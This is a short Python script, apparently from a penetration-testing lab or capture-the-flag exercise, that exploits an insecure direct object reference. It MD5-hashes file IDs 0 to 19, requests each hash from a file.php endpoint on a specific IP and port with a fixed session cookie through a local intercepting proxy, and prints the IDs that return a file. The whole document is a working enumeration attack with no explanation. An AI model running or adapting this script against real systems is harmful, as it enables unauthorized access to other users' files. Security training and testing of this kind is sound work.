import hashlib, requests

URL = "http://94.237.55.114:45544/file.php"
COOKIE = {"PHPSESSID": "uo3gulomlgah2lh80u9ic04guo"}
PROXY = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}

for file_id in range(20):
    id_hash = hashlib.md5(str(file_id).encode()).hexdigest()

    r = requests.get(URL, params={"file": id_hash}, cookies=COOKIE, proxies=PROXY)
    if not "File does not exist!" in r.text:
        print(f"Found file with id: {file_id} -> {id_hash}")